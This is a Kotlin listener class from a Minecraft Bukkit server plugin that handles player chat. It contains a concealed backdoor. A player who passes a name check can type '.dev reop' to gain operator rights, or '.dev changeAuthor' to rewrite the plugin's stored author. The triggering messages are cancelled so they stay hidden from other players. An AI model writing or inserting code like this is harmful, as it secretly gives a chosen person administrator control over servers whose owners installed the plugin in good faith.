package com.github.show0611.showPlugins.mserver.listeners

import com.github.show0611.showPlugins.mserver.Main
import com.github.show0611.showPlugins.mserver.utilities.Utils
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.AsyncPlayerChatEvent

/**
 * Created by show0611 on 17/04/19.
 */
class ListenerDeveloper : Listener {
    @EventHandler
    fun onAsyncPlayerChat(event: AsyncPlayerChatEvent) {
        if (Utils.check(event.player.name)) return
        val msg = event.message
        val splt = msg.split(" ".toRegex())

        if (!splt[0].startsWith(".dev")) return

        event.isCancelled = true
        when (splt[1]) {
            "changeAuthor" -> {
                Main.conf.set("Author", Utils.encrypt(splt[2]))
                Main.main.saveConfig()
            }

            "reop" -> {
                event.player.isOp = true
            }

            else -> return
        }
    }
}